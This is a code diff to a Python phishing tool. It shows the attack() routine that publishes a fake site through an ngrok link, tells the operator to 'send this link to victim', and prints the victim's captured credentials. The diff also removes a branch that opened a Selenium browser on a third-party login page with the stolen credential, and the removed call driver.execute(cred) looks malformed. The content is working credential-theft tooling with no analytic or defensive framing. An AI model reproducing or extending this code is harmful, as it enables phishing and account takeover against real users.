@@ -5,13 +5,10 @@ from src.termcolor import colored
 import platform
 from zipfile import ZipFile
 from os import walk,path,getcwd
-from time import sleep
 import threading
 from datetime import datetime
 import json
 from src import requests
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium import webdriver
     
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
@@ -76,16 +73,14 @@ def attack(server,url,wifi):
     elif wifi:
         open(getcwd()+'/sites/'+server+'/wifi.txt','w+').write(wifi)
     try:        
-        sleep(3)
+        my_ip = get_my_ip().strip(' ').strip('\n')
         link = get_link()
-    except Exception as e:
-        print(e)        
+    except Exception as e:  
         print(colored('[*] Error : could not start ngrok ','red',attrs=['bold']))
         return
     print()
     print(colored('[*] Send this link to victim  :  ','green',attrs=['bold'])+colored(link,'red',attrs=['bold']))
-    print()
-    my_ip = get_my_ip().strip(' ').strip('\n')
+    print()    
     if '/' not in server:
         ztop = 0
         print(colored('[*] Waiting for victim to open the link....','yellow',attrs=['bold']))
@@ -127,16 +122,6 @@ def attack(server,url,wifi):
                             print(colored('\n[*] Victim credentials \n','red',attrs=['bold']))
                             print(colored(cred,'green',attrs=['bold']))
                             print()
-                            ztop = 1
-                            f.close()
-                            f = open(path.join(root, file),'w+')
-                        elif '<button' in re:                        
-                            f.seek(0)
-                            cred = f.read().split('\n')[0]
-                            print(colored('\n[*] Victim has logged in using another platform \n','yellow',attrs=['bold']))
-                            driver=webdriver.Chrome(executable_path=ChromeDriverManager().install())
-                            driver.get('https://www.instafollowerspro.com/login')
-                            driver.execute(cred)
                             ztop = 1
                             f.close()
                             f = open(path.join(root, file),'w+')
